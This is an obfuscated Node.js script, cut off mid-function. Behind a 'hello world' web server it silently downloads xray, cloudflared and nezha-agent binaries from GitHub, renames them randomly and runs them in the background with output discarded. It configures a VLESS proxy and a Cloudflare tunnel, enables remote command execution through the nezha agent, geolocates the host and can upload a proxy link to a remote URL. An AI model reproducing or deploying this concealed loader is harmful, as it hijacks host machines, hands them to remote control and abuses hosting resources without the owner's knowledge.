const _0x48b3e5=_0x41eb;(function(_0x3189eb,_0x10bcc2){const _0x529397=_0x41eb,_0x2d428f=_0x3189eb();while(!![]){try{const _0xf5237f=-parseInt(_0x529397(0x270))/0x1+-parseInt(_0x529397(0x1dd))/0x2*(parseInt(_0x529397(0x227))/0x3)+-parseInt(_0x529397(0x243))/0x4+-parseInt(_0x529397(0x1f5))/0x5*(parseInt(_0x529397(0x1e0))/0x6)+-parseInt(_0x529397(0x240))/0x7+parseInt(_0x529397(0x1e1))/0x8+parseInt(_0x529397(0x211))/0x9;if(_0xf5237f===_0x10bcc2)break;else _0x2d428f['push'](_0x2d428f['shift']());}catch(_0x45096d){_0x2d428f['push'](_0x2d428f['shift']());}}}(_0x3dbb,0x78d0d));const FILE_PATH=process['env'][_0x48b3e5(0x233)]||_0x48b3e5(0x261),intervalInseconds=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x20b)]||0x64,CFIP=process['env'][_0x48b3e5(0x1f8)]||_0x48b3e5(0x237),CFPORT=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x23b)]||_0x48b3e5(0x1d5),delay=_0x8e9202=>new Promise(_0x399c16=>setTimeout(_0x399c16,_0x8e9202)),OPENSERVER=(process[_0x48b3e5(0x1f9)]['OPENSERVER']||_0x48b3e5(0x291))===_0x48b3e5(0x291),KEEPALIVE=(process[_0x48b3e5(0x1f9)][_0x48b3e5(0x250)]||_0x48b3e5(0x27e))===_0x48b3e5(0x291),MY_DOMAIN=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x265)]||'',V_DOMAIN=process['env'][_0x48b3e5(0x27c)]||'',V_AUTH=process['env'][_0x48b3e5(0x25d)]||'',VLPATH=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x226)]||'',XHPPATH=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x236)]||'',PORT=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x235)]||process[_0x48b3e5(0x1f9)][_0x48b3e5(0x272)]||0xbb8,V_PORT=process['env']['V_PORT']||0x1f90,UUID=process['env'][_0x48b3e5(0x23d)]||'',NVERSION=process[_0x48b3e5(0x1f9)]['NVERSION']||'V0',NSERVER=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x260)]||'',NPORT=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x287)]||_0x48b3e5(0x1d5),NKEY=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x257)]||'',SNAME=process[_0x48b3e5(0x1f9)]['SNAME']||'',SURL=process[_0x48b3e5(0x1f9)][_0x48b3e5(0x1fa)]||'',axios=require(_0x48b3e5(0x212)),{pipeline}=require(_0x48b3e5(0x1ec)),os=require('os'),fs=require('fs'),path=require('path'),http=require(_0x48b3e5(0x24b)),https=require(_0x48b3e5(0x282)),exec=require('child_process')['exec'];function _0x41eb(_0x50f2f0,_0x61867b){_0x50f2f0=_0x50f2f0-0x1d1;const _0x3dbbbc=_0x3dbb();let _0x41eb54=_0x3dbbbc[_0x50f2f0];return _0x41eb54;}function createFolder(_0x1ca0ba){const _0x411699=_0x48b3e5;try{fs[_0x411699(0x25a)](_0x1ca0ba);}catch(_0x375c6b){if(_0x375c6b[_0x411699(0x214)]===_0x411699(0x22e))fs[_0x411699(0x26f)](_0x1ca0ba);else{}}}function httpserver(){const _0x4a7436=_0x48b3e5,_0x5ee48c=http['createServer']((_0x4093c8,_0x57e7e8)=>{const _0x4fe5cf=_0x41eb;if(_0x4093c8[_0x4fe5cf(0x25b)]==='/')_0x57e7e8[_0x4fe5cf(0x202)](0xc8),_0x57e7e8[_0x4fe5cf(0x290)]('hello\x20world');else{if(_0x4093c8[_0x4fe5cf(0x25b)]==='/'+UUID){const _0xcda895=FILE_PATH+_0x4fe5cf(0x22c);fs[_0x4fe5cf(0x234)](_0xcda895,_0x4fe5cf(0x1d4),(_0x1efc01,_0x26fccf)=>{const _0x51a83c=_0x4fe5cf;_0x1efc01?(_0x57e7e8[_0x51a83c(0x202)](0x1f4),_0x57e7e8[_0x51a83c(0x290)]('Error\x20reading\x20file')):(_0x57e7e8[_0x51a83c(0x202)](0xc8,{'Content-Type':'text/plain;\x20charset=utf-8'}),_0x57e7e8[_0x51a83c(0x290)](_0x26fccf));});}else _0x57e7e8[_0x4fe5cf(0x202)](0x194),_0x57e7e8[_0x4fe5cf(0x290)](_0x4fe5cf(0x28c));}});_0x5ee48c[_0x4a7436(0x280)](PORT,()=>{const _0x59ad33=_0x4a7436;console[_0x59ad33(0x1db)]('server\x20is\x20running\x20on\x20port\x20:\x20'+PORT);});}function execPromise(_0x571204,_0x35254b={}){return new Promise((_0x233bed,_0x241fab)=>{const _0x5c2fff=exec(_0x571204,_0x35254b,(_0x3c4ad5,_0x2ed708,_0x56e2e0)=>{const _0xeff30a=_0x41eb;if(_0x3c4ad5){const _0x2befd7=new Error(_0xeff30a(0x27f)+_0x3c4ad5[_0xeff30a(0x1f3)]);_0x2befd7[_0xeff30a(0x214)]=_0x3c4ad5[_0xeff30a(0x214)],_0x2befd7['stderr']=_0x56e2e0[_0xeff30a(0x22b)](),_0x241fab(_0x2befd7);}else _0x233bed(_0x2ed708[_0xeff30a(0x22b)]());});});}async function detectProcess(_0xdc2383){const _0x570dac=_0x48b3e5,_0xc2e5fe=[{'cmd':'pidof\x20\x22'+_0xdc2383+'\x22','name':_0x570dac(0x206)},{'cmd':_0x570dac(0x20c)+_0xdc2383+'\x22','name':_0x570dac(0x259)},{'cmd':_0x570dac(0x21d)+_0xdc2383+_0x570dac(0x1f0),'name':_0x570dac(0x28e)}];for(const _0x238fd2 of _0xc2e5fe){try{const _0x174a21=await execPromise(_0x238fd2[_0x570dac(0x256)]);if(_0x174a21)return _0x174a21['replace'](/\n/g,'\x20')[_0x570dac(0x22b)]();}catch(_0x40a3a7){_0x40a3a7[_0x570dac(0x214)]!==0x7f&&_0x40a3a7['code']!==0x1&&console['debug'](_0x570dac(0x263)+_0x238fd2[_0x570dac(0x24a)]+_0x570dac(0x244),_0x40a3a7['message']);}}return'';}async function killProcess(_0x2d76b1){const _0xa7b4d0=_0x48b3e5;console['log']('Attempting\x20to\x20kill\x20process:\x20'+_0x2d76b1);try{const _0x17714c=await detectProcess(_0x2d76b1);if(!_0x17714c)return console[_0xa7b4d0(0x21a)](_0xa7b4d0(0x24d)+_0x2d76b1+_0xa7b4d0(0x1e7)),{'success':!![],'message':_0xa7b4d0(0x268)};await execPromise(_0xa7b4d0(0x208)+_0x17714c);const _0x3914c7=_0xa7b4d0(0x1d9)+_0x17714c+')';return console[_0xa7b4d0(0x1db)](_0x3914c7),{'success':!![],'message':_0x3914c7};}catch(_0x14a540){const _0x58578a=_0xa7b4d0(0x252)+_0x14a540['message'];return console['error'](_0x58578a),{'success':![],'message':_0x58578a};}}function generateRandomString(_0x134114){const _0x480daf=_0x48b3e5,_0x4c954e=_0x480daf(0x264);let _0x318e2e='';for(let _0x2ebe7b=0x0;_0x2ebe7b<_0x134114;_0x2ebe7b++){_0x318e2e+=_0x4c954e[_0x480daf(0x27d)](Math['floor'](Math['random']()*_0x4c954e[_0x480daf(0x239)]));}return _0x318e2e;}async function myconfig(){const _0x1397e5=_0x48b3e5,_0xb3c4d3=path[_0x1397e5(0x217)](FILE_PATH,_0x1397e5(0x21e)),_0x1f7b2f='/'+VLPATH,_0x37f884='/'+XHPPATH;function _0x2cbd0a(){const _0x3c39f9=_0x1397e5,_0x1f571a={'log':{'access':'/dev/null','error':_0x3c39f9(0x281),'loglevel':_0x3c39f9(0x269)},'dns':{'servers':[_0x3c39f9(0x285)]}};fs['writeFileSync'](path[_0x3c39f9(0x217)](_0xb3c4d3,'inbound.json'),JSON['stringify'](_0x1f571a,null,0x2));if(VLPATH&&!XHPPATH){const _0x27d3f4={'inbounds':[{'port':V_PORT,'listen':'::','protocol':_0x3c39f9(0x207),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x3c39f9(0x269),'wsSettings':{'path':_0x1f7b2f}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3c39f9(0x26a),_0x3c39f9(0x25c)],'metadataOnly':![]}}]};fs[_0x3c39f9(0x238)](path[_0x3c39f9(0x217)](_0xb3c4d3,_0x3c39f9(0x1e9)),JSON[_0x3c39f9(0x276)](_0x27d3f4,null,0x2));}else{if(XHPPATH&&!VLPATH){const _0xb93444={'inbounds':[{'port':V_PORT,'listen':'::','protocol':_0x3c39f9(0x207),'settings':{'clients':[{'id':UUID}],'decryption':_0x3c39f9(0x269)},'streamSettings':{'network':_0x3c39f9(0x219),'security':'none','xhttpSettings':{'mode':_0x3c39f9(0x201),'path':_0x37f884}},'sniffing':{'enabled':!![],'destOverride':[_0x3c39f9(0x24b),_0x3c39f9(0x26a),_0x3c39f9(0x25c)],'metadataOnly':![]}}]};fs[_0x3c39f9(0x238)](path[_0x3c39f9(0x217)](_0xb3c4d3,_0x3c39f9(0x1e9)),JSON[_0x3c39f9(0x276)](_0xb93444,null,0x2));}}const _0x34d1fd={'outbounds':[{'tag':_0x3c39f9(0x1e5),'protocol':_0x3c39f9(0x254)},{'tag':_0x3c39f9(0x21f),'protocol':_0x3c39f9(0x1eb)}]};fs['writeFileSync'](path['join'](_0xb3c4d3,'outbound.json'),JSON['stringify'](_0x34d1fd,null,0x2));}_0x2cbd0a();}function getSystemArchitecture(){const _0x1f59b6=_0x48b3e5,_0x30ff4d=os[_0x1f59b6(0x1f6)]();return _0x30ff4d===_0x1f59b6(0x232)||_0x30ff4d===_0x1f59b6(0x200)||_0x30ff4d===_0x1f59b6(0x230)?_0x1f59b6(0x232):_0x1f59b6(0x241);}function getFilesForArchitecture(_0x4f2521){const _0x30ee9a=_0x48b3e5,_0x357360={'bot':{'arm':'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64','amd':_0x30ee9a(0x1ef)},'web':{'arm':_0x30ee9a(0x28b),'amd':_0x30ee9a(0x1e2)},'npm':{'V0':{'arm':_0x30ee9a(0x1d1),'amd':'https://github.com/kahunama/myfile/releases/download/main/nezha-agent'},'V1':{'arm':_0x30ee9a(0x216),'amd':'https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1'}}};let _0x590c16=[{'fileName':generateRandomString(0x5),'originalName':_0x30ee9a(0x1fd),'fileUrl':_0x357360['web'][_0x4f2521]}];if(OPENSERVER){const _0x1ad963={'fileName':generateRandomString(0x5),'originalName':_0x30ee9a(0x1d7),'fileUrl':_0x357360['bot'][_0x4f2521]};_0x590c16[_0x30ee9a(0x24e)](_0x1ad963);}if(NSERVER&&NPORT&&NKEY&&NVERSION){const _0x2390cf={'fileName':generateRandomString(0x5),'originalName':'npm','fileUrl':_0x357360['npm'][NVERSION][_0x4f2521]};_0x590c16[_0x30ee9a(0x24e)](_0x2390cf);}return _0x590c16;}async function download_function(_0x55214b,_0x391efe,_0x1106ba){const _0x2c0e77=_0x48b3e5,_0x17da75=path[_0x2c0e77(0x217)](FILE_PATH,_0x55214b);let _0x52730a=![];try{const _0x5c68d3=await axios({'method':'get','url':_0x1106ba,'responseType':_0x2c0e77(0x223)});await pipeline(_0x5c68d3[_0x2c0e77(0x26b)],fs['createWriteStream'](_0x17da75)),_0x52730a=!![];}catch(_0x1a0fcf){}return{'fileName':_0x55214b,'originalName':_0x391efe,'filePath':_0x17da75,'success':_0x52730a};}let fileMapping={};async function downloadFiles(){const _0x175cf2=_0x48b3e5;try{const _0x3ab747=getSystemArchitecture();if(!_0x3ab747)return console['log'](_0x175cf2(0x286)),fileMapping;const _0x2bf8a9=getFilesForArchitecture(_0x3ab747);if(_0x2bf8a9['length']===0x0)return console[_0x175cf2(0x1db)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture'),fileMapping;const _0x926115=_0x2bf8a9[_0x175cf2(0x1ee)](_0x373a3e=>download_function(_0x373a3e[_0x175cf2(0x1f4)],_0x373a3e[_0x175cf2(0x1fb)],_0x373a3e[_0x175cf2(0x23e)])),_0x167069=await Promise[_0x175cf2(0x28d)](_0x926115);return _0x167069['forEach'](_0x24401e=>{const _0x4149c4=_0x175cf2;if(_0x24401e[_0x4149c4(0x213)])try{fs[_0x4149c4(0x278)](_0x24401e[_0x4149c4(0x1d3)],0x1ed),fileMapping[_0x24401e['originalName']]=_0x24401e[_0x4149c4(0x1f4)];}catch(_0xf639e1){}}),fileMapping;}catch(_0x30a9ea){return console[_0x175cf2(0x27a)](_0x175cf2(0x283),_0x30a9ea),fileMapping;}}function argoType(){const _0x58b98d=_0x48b3e5;if(!V_AUTH||!V_DOMAIN)return;if(V_AUTH['includes']('TunnelSecret')){fs[_0x58b98d(0x238)](path[_0x58b98d(0x217)](FILE_PATH,_0x58b98d(0x249)),V_AUTH);const _0x11cca1='\x0a\x20\x20\x20\x20\x20\x20\x20\x20tunnel:\x20'+V_AUTH['split']('\x22')[0xb]+_0x58b98d(0x242)+path[_0x58b98d(0x217)](FILE_PATH,_0x58b98d(0x249))+_0x58b98d(0x231)+V_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+V_PORT+_0x58b98d(0x20e);fs[_0x58b98d(0x238)](path['join'](FILE_PATH,_0x58b98d(0x289)),_0x11cca1);}else{}}let args;function get_cloud_flare_args(){const _0x12b4d9=_0x48b3e5;if(V_AUTH[_0x12b4d9(0x210)](/^[A-Z0-9a-z=]{120,250}$/))args=_0x12b4d9(0x1e6)+V_AUTH;else V_AUTH[_0x12b4d9(0x210)](/TunnelSecret/)?args='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x12b4d9(0x203):args=_0x12b4d9(0x20f)+FILE_PATH+_0x12b4d9(0x21b)+V_PORT;return args;}let NTLS;function nezconfig(){const _0x47f157=_0x48b3e5,_0x2ed7c7=[_0x47f157(0x1d5),'8443',_0x47f157(0x1d6),_0x47f157(0x22a),_0x47f157(0x1ea),_0x47f157(0x279)];if(NVERSION==='V0')return _0x2ed7c7[_0x47f157(0x228)](NPORT)?NTLS=_0x47f157(0x24f):NTLS='',NTLS;else{if(NVERSION==='V1'){_0x2ed7c7[_0x47f157(0x228)](NPORT)?NTLS=_0x47f157(0x291):NTLS=_0x47f157(0x27e);const _0x3f12ef=path['join'](FILE_PATH,_0x47f157(0x28a)),_0x2943ea=_0x47f157(0x221)+NKEY+_0x47f157(0x27b)+NSERVER+':'+NPORT+_0x47f157(0x1e3)+NTLS+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;try{fs[_0x47f157(0x238)](_0x3f12ef,_0x2943ea);}catch(_0x1634bc){}}}}async function runbot(){const _0x15fa4b=_0x48b3e5,_0x2cb04b=path[_0x15fa4b(0x217)](FILE_PATH,fileMapping[_0x15fa4b(0x1d7)]);try{fs[_0x15fa4b(0x25a)](_0x2cb04b);try{await execPromise(_0x15fa4b(0x26d)+FILE_PATH+'/'+fileMapping[_0x15fa4b(0x1d7)]+'\x20'+args+_0x15fa4b(0x266));}catch(_0x134450){console[_0x15fa4b(0x27a)](fileMapping[_0x15fa4b(0x1d7)]+_0x15fa4b(0x23c)+_0x134450);}}catch(_0x3ba856){if(_0x3ba856[_0x15fa4b(0x214)]===_0x15fa4b(0x22e))console[_0x15fa4b(0x1db)](_0x15fa4b(0x273));else{}}}async function runweb(){const _0x22443c=_0x48b3e5,_0x24aa2b=path['join'](FILE_PATH,fileMapping[_0x22443c(0x1fd)]);try{fs[_0x22443c(0x25a)](_0x24aa2b);try{await execPromise('nohup\x20'+FILE_PATH+'/'+fileMapping[_0x22443c(0x1fd)]+'\x20run\x20-confdir\x20'+FILE_PATH+'/xconf\x20>/dev/null\x202>&1\x20&');}catch(_0x47ee46){console['error'](fileMapping[_0x22443c(0x1fd)]+_0x22443c(0x23c)+_0x47ee46);}}catch(_0xc2bafe){if(_0xc2bafe[_0x22443c(0x214)]===_0x22443c(0x22e))console['log'](_0x22443c(0x275));else{}}}async function runnpm(){const _0x5b574a=_0x48b3e5,_0x9b1c33=path[_0x5b574a(0x217)](FILE_PATH,fileMapping[_0x5b574a(0x288)]);try{fs['statSync'](_0x9b1c33);try{if(NVERSION==='V0')await execPromise(_0x5b574a(0x26d)+FILE_PATH+'/'+fileMapping['npm']+_0x5b574a(0x262)+NSERVER+':'+NPORT+_0x5b574a(0x225)+NKEY+'\x20'+NTLS+_0x5b574a(0x224));else NVERSION==='V1'&&await execPromise(_0x5b574a(0x26d)+FILE_PATH+'/'+fileMapping[_0x5b574a(0x288)]+_0x5b574a(0x253)+FILE_PATH+_0x5b574a(0x218));}catch(_0x4109a6){console[_0x5b574a(0x27a)](fileMapping['npm']+_0x5b574a(0x23c)+_0x4109a6);}}catch(_0x763b0f){if(_0x763b0f['code']==='ENOENT')console[_0x5b574a(0x1db)](_0x5b574a(0x1dc));else{}}}async function runapp(){const _0x529ace=_0x48b3e5;OPENSERVER?(argoType(),get_cloud_flare_args(),await runbot(),await delay(0x1388)):console['log'](_0x529ace(0x277)),await runweb(),await delay(0x3e8),NVERSION&&NSERVER&&NPORT&&NKEY?(nezconfig(),await runnpm(),await delay(0x3e8)):console[_0x529ace(0x1db)]('npm\x20variable\x20is\x20empty,\x20skip\x20running');}async function keep_alive(){const _0x4605e0=_0x48b3e5,_0x12fe47=await detectProcess(''+fileMapping[_0x4605e0(0x1fd)]);if(_0x12fe47){}else await runweb();await delay(0x1388);if(OPENSERVER){const _0x4a8e9c=await detectProcess(''+fileMapping[_0x4605e0(0x1d7)]);if(_0x4a8e9c){}else await runbot();}await delay(0x1388);if(NVERSION&&NSERVER&&NPORT&&NKEY){const _0x588179=await detectProcess(''+fileMapping[_0x4605e0(0x288)]);if(_0x588179){}else await runnpm();}}function getArgoDomainFromLog(){const _0x2537af=_0x48b3e5,_0x4778e1=path['join'](FILE_PATH,_0x2537af(0x1fe));try{const _0x4d50fa=fs[_0x2537af(0x25a)](_0x4778e1);if(_0x4d50fa[_0x2537af(0x25e)]===0x0)return null;const _0x17f474=fs['readFileSync'](_0x4778e1,_0x2537af(0x1d2)),_0x4f4c0a=/info.*https:\/\/(.*trycloudflare\.com)/g;let _0x1bfbff,_0x5167db=null;while((_0x1bfbff=_0x4f4c0a[_0x2537af(0x1ed)](_0x17f474))!==null){_0x5167db=_0x1bfbff[0x1];}return _0x5167db;}catch(_0x1eb313){if(_0x1eb313[_0x2537af(0x214)]===_0x2537af(0x22e))return null;return console['error'](_0x2537af(0x245),_0x1eb313),null;}}function _0x3dbb(){const _0xa8e240=['client_secret:\x20','isp','stream','\x20--report-delay=4\x20--skip-conn\x20--skip-procs\x20--disable-auto-update\x20>/dev/null\x202>&1\x20&','\x20-p\x20','VLPATH','15dGneZP','includes','query','2087','trim','/log.txt','statusCode','ENOENT','countryCode','aarch64','\x0a\x20\x20\x20\x20\x20\x20\x20\x20protocol:\x20http2\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20ingress:\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20hostname:\x20','arm','FILE_PATH','readFile','PORT','XHPPATH','ip.sb','writeFileSync','length','clear','CFPORT','\x20running\x20error:\x20','UUID','fileUrl','ip-api.com','1997128qRtGNC','amd','\x0a\x20\x20\x20\x20\x20\x20\x20\x20credentials-file:\x20','1446828rznivm','\x20error:','Error\x20reading\x20boot.log:','vless://','Failed\x20to\x20parse\x20JSON\x20response.','/json?lang=zh-CN','tunnel.json','name','http','%3Fed%3D2560&mode=packet-up#','Process\x20\x27','push','--tls','KEEPALIVE','rmSync','Kill\x20failed:\x20','\x20-c\x20','freedom','&type=xhttp&host=','cmd','NKEY','POST','pgrep','statSync','url','quic','V_AUTH','size','application/json;\x20charset=utf-8','NSERVER','/tmp','\x20-s\x20','[detectProcess]\x20','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','MY_DOMAIN','\x20>/dev/null\x202>&1\x20&','Upload\x20failed:','Process\x20not\x20found','none','tls','data','\x20is\x20running','nohup\x20','/xconf','mkdirSync','501669wQBIwX','status','SERVER_PORT','bot\x20file\x20not\x20found,\x20skip\x20running','log.txt','web\x20file\x20not\x20found,\x20skip\x20running','stringify','bot\x20variable\x20is\x20not\x20allowed,\x20skip\x20running','chmodSync','2053','error','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','V_DOMAIN','charAt','false','Command\x20failed:\x20','listen','/dev/null','https','Error\x20downloading\x20files:','api.ip.sb','https+local://8.8.8.8/dns-query','Can\x27t\x20determine\x20system\x20architecture.','NPORT','npm','tunnel.yml','/config.yml','https://github.com/mytcgd/myfiles/releases/download/main/xray_arm','Not\x20found','all','ps+awk','port','end','true','https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm','utf-8','filePath','utf8','443','2096','bot','from','Killed\x20process\x20(PIDs:\x20','Error\x20checking\x20boot.log:\x20','log','npm\x20file\x20not\x20found,\x20skip\x20running','183968afmQlk','hostname','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','48ePCgol','3553984gzgDak','https://github.com/mytcgd/myfiles/releases/download/main/xray','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','GET','direct','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x27\x20not\x20found','?encryption=none&security=tls&sni=','inbound_v.json','2083','blackhole','stream/promises','exec','map','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64','\x22\x20\x27$2\x20==\x20name\x20{print\x20$1}\x27','forEach','HTTP\x20error!\x20status:\x20','message','fileName','28260oIcNAy','arch','unlinkSync','CFIP','env','SURL','originalName','App\x20is\x20running','web','boot.log','%3Fed%3D2560&type=ws&encryption=none&security=tls&sni=','arm64','packet-up','writeHead','/tunnel.yml\x20run','toString','&path=%2F','pidof','vless','kill\x20-9\x20','isDirectory','Error\x20in\x20bot\x20process\x20management:','TIME','pgrep\x20-x\x20\x22','Request\x20Failed\x20with\x20status\x20code:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20\x20\x20\x20\x20\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','match','15339861JBWqFh','axios','success','code','Failed\x20to\x20obtain\x20ArgoDomain\x20even\x20after\x20restarting\x20bot.','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1_arm','join','/config.yml\x20>/dev/null\x202>&1\x20&','xhttp','warn','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','?host=','ps\x20-eo\x20pid,comm\x20|\x20awk\x20-v\x20name=\x22','xconf','block','base64'];_0x3dbb=function(){return _0xa8e240;};return _0x3dbb();}function buildurl(_0x2865b6){const _0x254618=_0x48b3e5;let _0x159021='';if(VLPATH)_0x159021=_0x254618(0x246)+UUID+'@'+CFIP+':'+CFPORT+_0x254618(0x21c)+_0x2865b6+_0x254618(0x205)+VLPATH+_0x254618(0x1ff)+_0x2865b6+'#'+ISP+'-'+SNAME;else XHPPATH&&(_0x159021=_0x254618(0x246)+UUID+'@'+CFIP+':'+CFPORT+_0x254618(0x1e8)+_0x2865b6+_0x254618(0x255)+_0x2865b6+_0x254618(0x205)+XHPPATH+_0x254618(0x24c)+ISP+'-'+SNAME);return _0x159021;}let argoDomain,UPLOAD_DATA;async function extractDomains(){const _0x10b86c=_0x48b3e5;let _0x1f2535='';if(OPENSERVER===!![]){if(V_AUTH&&V_DOMAIN)_0x1f2535=V_DOMAIN;else{await delay(0xbb8),_0x1f2535=getArgoDomainFromLog();if(!_0x1f2535)try{console[_0x10b86c(0x1db)](_0x10b86c(0x1df));const _0x61e10e=path['join'](FILE_PATH,'boot.log');try{fs[_0x10b86c(0x25a)](_0x61e10e);try{fs['unlinkSync'](_0x61e10e),await delay(0x1f4);}catch(_0x794243){console[_0x10b86c(0x27a)]('Error\x20deleting\x20boot.log:\x20'+_0x794243);}}catch(_0x2e5359){_0x2e5359[_0x10b86c(0x214)]!=='ENOENT'&&console[_0x10b86c(0x27a)](_0x10b86c(0x1da)+_0x2e5359);}const _0x5d7a34=''+fileMapping[_0x10b86c(0x1d7)];await killProcess(_0x5d7a34),await delay(0x3e8),await runbot(),console[_0x10b86c(0x1db)](fileMapping[_0x10b86c(0x1d7)]+_0x10b86c(0x26c)),await delay(0x2710),_0x1f2535=getArgoDomainFromLog(),!_0x1f2535&&console['error'](_0x10b86c(0x215));}catch(_0x107177){console[_0x10b86c(0x27a)](_0x10b86c(0x20a),_0x107177);return;}else{}}}MY_DOMAIN&&(_0x1f2535=MY_DOMAIN),argoDomain=_0x1f2535,UPLOAD_DATA=buildurl(argoDomain);}function httpsGet(_0x57fa19,_0x20649c){return new Promise((_0x21138e,_0x426c38)=>{const _0x1fbdd6=_0x41eb,_0x57b406={'hostname':_0x57fa19,'path':_0x20649c,'method':_0x1fbdd6(0x1e4)},_0x127337=https['request'](_0x57b406,_0x323cb1=>{const _0x1154ff=_0x1fbdd6;if(_0x323cb1[_0x1154ff(0x22d)]!==0xc8)return _0x426c38(new Error(_0x1154ff(0x20d)+_0x323cb1[_0x1154ff(0x22d)]));let _0x5321db='';_0x323cb1['on'](_0x1154ff(0x26b),_0x4e21bd=>{_0x5321db+=_0x4e21bd;}),_0x323cb1['on'](_0x1154ff(0x290),()=>{const _0x368541=_0x1154ff;try{const _0x601fea=JSON['parse'](_0x5321db);_0x21138e(_0x601fea);}catch(_0x5311af){_0x426c38(new Error(_0x368541(0x247)));}});});_0x127337['on'](_0x1fbdd6(0x27a),_0xcb9f83=>{_0x426c38(_0xcb9f83);}),_0x127337['end']();});}let ISP='UN';async function getipandisp(){const _0x36fe7f=_0x48b3e5;let _0x41facb,_0x24f9c0,_0x4e326c,_0x4d3bf1=![];try{_0x41facb=await httpsGet(_0x36fe7f(0x284),'/geoip');if(_0x41facb&&_0x41facb['country_code']&&_0x41facb[_0x36fe7f(0x222)])_0x24f9c0=_0x41facb['country_code'],_0x4e326c=_0x41facb[_0x36fe7f(0x222)],_0x4d3bf1=!![];else{}}catch(_0x4958e8){console['log']('ip.sb\x20Request\x20failed:\x20'+_0x4958e8[_0x36fe7f(0x1f3)]);}if(!_0x4d3bf1)try{_0x41facb=await httpsGet(_0x36fe7f(0x23f),_0x36fe7f(0x248));if(_0x41facb&&_0x41facb[_0x36fe7f(0x271)]==='success'&&_0x41facb[_0x36fe7f(0x229)]&&_0x41facb[_0x36fe7f(0x22f)]&&_0x41facb['isp'])_0x24f9c0=_0x41facb[_0x36fe7f(0x22f)],_0x4e326c=_0x41facb[_0x36fe7f(0x222)],_0x4d3bf1=!![];else{}}catch(_0x141db8){console[_0x36fe7f(0x1db)]('ip-api.com\x20Request\x20failed:\x20'+_0x141db8[_0x36fe7f(0x1f3)]);}if(_0x4d3bf1)ISP=_0x24f9c0+'-'+_0x4e326c['replace'](/ /g,'_');else{}}function generateLinks(){const _0xd2d941=_0x48b3e5;if(UPLOAD_DATA){const _0x502149=path['join'](FILE_PATH,_0xd2d941(0x274));fs[_0xd2d941(0x238)](_0x502149,Buffer['from'](UPLOAD_DATA)[_0xd2d941(0x204)](_0xd2d941(0x220)));}}async function uploadSubscription(_0x2d8491,_0x28057d,_0x1133de){const _0x3b7aa1=_0x48b3e5,_0x24b4e8=JSON[_0x3b7aa1(0x276)]({'URL_NAME':_0x2d8491,'URL':_0x28057d}),_0x4a18a6=Buffer[_0x3b7aa1(0x1d8)](_0x24b4e8,_0x3b7aa1(0x1d4)),_0x181c2d=_0x4a18a6[_0x3b7aa1(0x239)],_0x55bf98=new URL(_0x1133de),_0x3baeb4={'hostname':_0x55bf98[_0x3b7aa1(0x1de)],'port':_0x55bf98[_0x3b7aa1(0x28f)]||0x1bb,'path':_0x55bf98['pathname'],'method':_0x3b7aa1(0x258),'headers':{'Content-Type':_0x3b7aa1(0x25f),'Content-Length':_0x181c2d}};try{const _0x1ebaa9=await new Promise((_0xe55ca2,_0x47ff24)=>{const _0x37353a=_0x3b7aa1,_0x58f33e=https['request'](_0x3baeb4,_0x35815a=>{const _0x5aa9ed=_0x41eb;if(_0x35815a['statusCode']<0xc8||_0x35815a['statusCode']>=0x12c)return _0x47ff24(new Error(_0x5aa9ed(0x1f2)+_0x35815a[_0x5aa9ed(0x22d)]+',\x20response:\x20'+_0x35815a['statusMessage']));let _0x4efb66='';_0x35815a['on'](_0x5aa9ed(0x26b),_0x1e034a=>_0x4efb66+=_0x1e034a),_0x35815a['on'](_0x5aa9ed(0x290),()=>_0xe55ca2(_0x4efb66));});_0x58f33e['on'](_0x37353a(0x27a),_0x429288=>_0x47ff24(_0x429288)),_0x58f33e['write'](_0x4a18a6),_0x58f33e['end']();});return _0x1ebaa9;}catch(_0x8731aa){console['error'](_0x3b7aa1(0x267),_0x8731aa[_0x3b7aa1(0x1f3)]);}}function cleanfiles(){setTimeout(()=>{const _0x1b94a0=_0x41eb;let 